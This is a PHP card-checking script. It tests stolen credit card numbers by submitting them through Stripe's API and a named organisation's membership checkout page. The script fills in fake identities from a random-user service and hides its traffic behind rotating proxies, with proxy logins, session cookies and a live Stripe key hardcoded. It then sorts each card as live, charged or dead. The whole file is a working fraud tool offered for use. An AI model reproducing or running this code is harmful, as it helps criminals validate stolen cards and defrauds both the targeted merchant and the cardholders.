
<?php 
error_reporting(0);
//---------------------------------------//
$mtc_site = "https://jaxcc.org/membership-account-2/membership-checkout/?level=2" ;
$amt = "accept" ;
//---------------------------------------//

$update = file_get_contents('php://input');
$update = json_decode($update, TRUE);
$print = print_r($update);
if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
;

//==================[Randomizing Details]======================//
$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];
//==================[Randomizing Details-END]======================//

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}
$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

function rebootproxys()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = rebootproxys();

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}
/////////////===[Proxy]/////////////
$rp1 = array(
  1 => 'kfkqyrol-rotate:jka20abc2877',
  2 => 'ywfmqtbi-rotate:yfcbcbownp9p',
  3 => 'zvynypmx-rotate:wtcclm2u3ozc',
  4 => 'sidryfje-rotate:469fi5zt2yo4',
  5 => 'xpmifrvd-rotate:zt8bndzd1t7x',
  6 => 'lcbjzvjv-rotate:n30hp47rkwpa',
  7 => 'efhauogi-rotate:h28girrhxb3i',
  8 => 'uhzzodzl-rotate:86295azuhrar',
  9 => 'ozzozaxn-rotate:ecxo19jmbtx6',
  10 => 'uhyehnfe-rotate:fz9xfos83uii',
  11 => 'rtkjtbdz-rotate:9rwjgzs7h9hk',
  12 => 'aybkhbcy-rotate:kkx5tyuv8nsf',
  13 => 'eorahscd-rotate:7r67qrdmulm9',
  14 => 'qxbxceqg-rotate:eiopf00jcv8o',
  15 => 'sqbfhwcj-rotate:2p923i50rryc',
  16 => 'woszotux-rotate:uqogr44mzcdr',
  17 => 'jpdszbab-rotate:gplwi9s4pjh6',
  18 => 'dzaeexnk-rotate:mpj03r9u5ujl',
  19 => 'pxumvufh-rotate:no8hpjihgvsy',
  20 => 'kmlasheo-rotate:fmv7lsj498rh',
  21 => 'twlvunvx-rotate:lz8l4ximgkcw',
  22 => 'jdyweald-rotate:e186bbe2dbtp',
  23 => 'rruteeve-rotate:xif2651bh7lv',
  24 => 'yowhehuy-rotate:tzkdoe9bd9qr',
  25 => 'uwdcbzyp-rotate:8epg2s10i9kz',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
$ip = array(
  1 => 'http://38.154.227.167:5868',
  2 => 'http://185.199.229.156:7492',
  3 => 'http://185.199.228.220:7300',
  4 => 'http://185.199.231.45:8382',
  5 => 'http://188.74.210.207:6286',
  6 => 'http://188.74.183.10:8279',
  7 => 'http://188.74.210.21:6100',
  8 => 'http://45.155.68.129:8133',
  9 => 'http://154.95.36.199:6893',
  10 => 'http://45.94.47.66:8110',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];
$url = "https://api.ipify.org/";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();
if (isset($ip1)){
$ip = "";
}
if (empty($ip1)){
$ip = "";
}
# --------------------[Proxy End]-----------------#

# -------------------- [1 REQ] -------------------#
$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "$ip"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: api.stripe.com',
'method: POST',
'path: /v1/payment_methods',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.5',
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

# ----------------- [1req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[address][line1]=135&billing_details[address][line2]=&billing_details[address][city]=montezuma&billing_details[address][state]=indiana&billing_details[address][postal_code]=47862&billing_details[address][country]=US&billing_details[name]=asem+bi&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=31d19674-23cd-4497-8990-ed581cab44370e57f9&muid=5425701b-a0ce-45a6-8ca2-147bc3c47c43c16075&sid=dbac66f3-f58e-4f06-9400-f7b279d36c87683944&pasted_fields=number&payment_user_agent=stripe.js%2F7e8ee2cfca%3B+stripe-js-v3%2F7e8ee2cfca%3B+split-card-element&referrer=https%3A%2F%2Fjaxcc.org&time_on_page=67044&key=pk_live_74xoS62Pi5J9jPQdKthAUf7u');




$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
#$pi = Getstr($result1,'client_secret":"','_secret');

#$src = Getstr($result1,'client_secret":"','"');
# -------------------- [2 REQ] -------------------#

$ch = curl_init();
//curl_setopt($ch, CURLOPT_PROXY, "$ip"); 
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
//curl_setopt($ch, CURLOPT_PROXY, $poxySocks4);
curl_setopt($ch, CURLOPT_URL, 'https://jaxcc.org/membership-account-2/membership-checkout/?level=2');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
    curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: jaxcc.org',
'method: POST',
'path: /membership-account-2/membership-checkout/?level=2',
'scheme: https',
'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'accept-language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
'content-type: application/x-www-form-urlencoded',
'cookie: asp_transient_id=5038a6e93c5bc46e1d67a2e54bfee1a9;PHPSESSID=51a23ef4e4c23d4f29b8b865a7e5924d;pmpro_visit=1;__stripe_mid=5425701b-a0ce-45a6-8ca2-147bc3c47c43c16075;__stripe_sid=dbac66f3-f58e-4f06-9400-f7b279d36c87683944',
'origin: https://jaxcc.org',
'referer: https://jaxcc.org/membership-account-2/membership-checkout/?level=2',
'sec-fetch-dest: document',
'sec-fetch-mode: navigate',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.97 Mobile Safari/537.36',
   ));

# ----------------- [2req Postfields] ---------------------#

curl_setopt($ch, CURLOPT_POSTFIELDS,'level=2&checkjavascript=1&other_discount_code=&username='.$name.''.$last.'&password=4403934440007040&password2=4403934440007040&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&bfirstname='.$name.'&blastname='.$last.'&baddress1=1374+Nort+Street&baddress2=&bcity=Montezuma&bstate=Indiana&bzipcode=47862&bcountry=US&bphone='.$phone.'&CardType=visa&discount_code=&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX7040&ExpirationMonth=07&ExpirationYear=2027');



$result2 = curl_exec($ch);
# ---------------------------------------#


# ---------------- [Responses] ----------------- #
if(strpos($result2, "payment_intent_unexpected_state")) {



    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Payment Intent Confirmed ⚠️ '.$ip1.'</span><br>';

    }

elseif(strpos($result2, "succeeded")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅checker '.$ip1.'  </span><br>';
    exit;
    }



elseif(strpos($result2, "incorrect_zip")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE ✅checker '.$ip1.'  </span><br>';
    exit;
    }
    
    elseif(strpos($result2, "Your card has insufficient funds.")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: INSUFFICIENT FUNDS ✅checker '.$ip1.'  </span><br>';
    exit;
    }

elseif(strpos($result2, 'security code is incorrect.')) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: security code is incorrect ✅checker '.$ip1.'  </span><br>';
    exit;
    }
    elseif(strpos($result2, 'security code is invalid.')) {

        echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: security code is invalid ✅checker '.$ip1.'  </span><br>';
        exit;
        }
    elseif(strpos($result2, "Security code is incorrect")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Security code is incorrect ✅checker '.$ip1.'  </span><br>';
    }
    
elseif(strpos($result2, "transaction_not_allowed")) {

    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  transaction_not_allowed ✅checker '.$ip1.'   </span><br>';
    exit;
    }
    

elseif(strpos($result2, "stripe_3ds2_fingerprint")) {


    echo '#LIVE</span>  </span>CC:  '.$lista.'</span>  <br>Result:  3D ✅checker '.$ip1.'   </span><br>';
    exit;
    }
elseif(strpos($result2, "generic_decline")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: GENERIC DECLINE ❌ '.$ip1.'</span><br>';
    }

elseif(strpos($result2, "do_not_honor")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: DO NOT HONOR ❌ '.$ip1.'</span><br>';

}


elseif(strpos($result2, "fraudulent")) {
    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: FRAUDULENT ❌ '.$ip1.'</span><br>';

}
elseif(strpos($result2, "intent_confirmation_challenge")) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Captcha ⚠️ '.$ip1.'</span><br>';

    }


elseif(strpos($result2, 'Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip1.'</span><br>';
}

elseif(strpos($result2, 'Error updating default payment method. Your card was declined.')) {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: Decline '.$ip1.'</span><br>';
}

elseif(strpos($result2, '"cvc_check": "pass"')) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CVV LIVE ✅checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Membership Confirmation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: Membership Confirmation '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your support!")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank you for your donation")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "/wishlist-member/?reg=")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You For Donation.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "Thank You")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CHARGED '.$amt.' ✅checker '.$ip1.' </span><br>';
exit;
}

elseif(strpos($result2, "incorrect_cvc")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: CCN LIVE ✅checker '.$ip1.'   </span><br>';
exit;
}

elseif(strpos($result2, "Card is declined by your bank, please contact them for additional information.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: CVV LIVE ✅checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card does not support this type of purchase.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result: CVV LIVE Your card does not support this type of purchase. ✅checker '.$ip1.'  </span><br>';
exit;
}

elseif(strpos($result2, "Your card is not supported.")) {

    echo '#CHARGED</span>  </span>CC:  '.$lista.'</span><br>Result:CARD NOT SUPPORTED '.$ip1.' </span><br>';
exit;
}


else {

    echo '#DIE</span>  </span>CC:  '.$lista.'</span>  <br>Result: CARD DECLINED ❌ '.$ip1.'</span><br>';

}



curl_close($ch);
ob_flush();
#echo $result1;
#echo $result2; 
?>